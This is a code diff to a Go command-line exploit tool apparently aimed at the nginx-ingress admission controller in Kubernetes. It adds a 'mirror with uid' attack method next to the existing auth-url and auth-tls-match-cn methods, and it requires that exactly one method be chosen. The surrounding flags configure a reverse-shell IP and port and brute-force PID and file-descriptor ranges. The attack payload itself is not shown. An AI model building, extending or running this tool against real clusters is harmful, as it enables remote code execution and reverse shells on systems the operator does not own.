@@ -64,6 +64,7 @@ func init() {
 	ExpCmd.Flags().BoolVarP(&Opts.IsAuthURL, "is-auth-url", "a", true, "using auth-url to attack (default)")
 	ExpCmd.Flags().BoolVarP(&Opts.IsAuthTLSMatchCN, "is-match-cn", "A", false, "using auth-tls-match-cn to attack (not default)")
 	ExpCmd.Flags().StringVarP(&Opts.AuthSecret, "auth-secret-name", "U", "", "if using auth-tls-match-cn, secret name is required, example: kube-system/cilium-ca")
+	ExpCmd.Flags().BoolVarP(&Opts.IsMirrorWithUID, "is-mirror-with-uid", "M", false, "using mirror with uid")
 
 	ExpCmd.Flags().IPVarP(&Opts.ReverseShellIp, "reverse-shell-ip", "r", defaultPodIp(), "reverse shell ip")
 	ExpCmd.Flags().Uint16VarP(&Opts.ReverseShellPort, "reverse-shell-port", "p", 0, "reverse shell port")
@@ -81,6 +82,16 @@ func init() {
 	ExpCmd.Flags().IntVarP(&Opts.PidRangeEnd, "pid-range-end", "E", 40, "distance to pid range end")
 	ExpCmd.Flags().IntVarP(&Opts.FdRangeStart, "fd-range-start", "s", 3, "fd range start")
 	ExpCmd.Flags().IntVarP(&Opts.FdRangeEnd, "fd-range-end", "e", 26, "distance fd range end")
+}
+
+func boolCounts(flags ...bool) int {
+	value := 0
+	for _, flag := range flags {
+		if flag {
+			value++
+		}
+	}
+	return value
 }
 
 var ExpCmd = &cobra.Command{
@@ -104,18 +115,19 @@ var ExpCmd = &cobra.Command{
 		if Opts.AuthSecret != "" {
 			Opts.IsAuthTLSMatchCN = true
 			Opts.IsAuthURL = false
+			Opts.IsMirrorWithUID = false
 		}
 		if Opts.IsAuthTLSMatchCN && Opts.AuthSecret == "" {
 			log.Fatal("auth-secret-name is required when using auth-tls-match-cn")
 		}
-		if Opts.IsAuthURL && Opts.IsAuthTLSMatchCN {
-			log.Fatal("auth-url and auth-tls-match-cn are mutually exclusive")
+		if Opts.IsMirrorWithUID {
+			Opts.IsAuthURL = false
+			Opts.IsAuthTLSMatchCN = false
 		}
-		err := nginx_ingress.RenderValidateJSON(nginx_ingress.ExploitMethod{
-			IsAuthURL:        Opts.IsAuthURL,
-			IsAuthTLSMatchCN: Opts.IsAuthTLSMatchCN,
-			AuthSecret:       Opts.AuthSecret,
-		})
+		if boolCounts(Opts.IsMirrorWithUID, Opts.IsAuthURL, Opts.IsAuthTLSMatchCN) != 1 {
+			log.Fatal("is-auth-url, is-auth-tls-match-cn, is-mirror-with-uid are three different exploit method, only one can be selected")
+		}
+		err := nginx_ingress.RenderValidateJSON(Opts.ExploitMethod)
 		if err != nil {
 			log.Fatalf("error validating exploit method: %v", err)
 		}
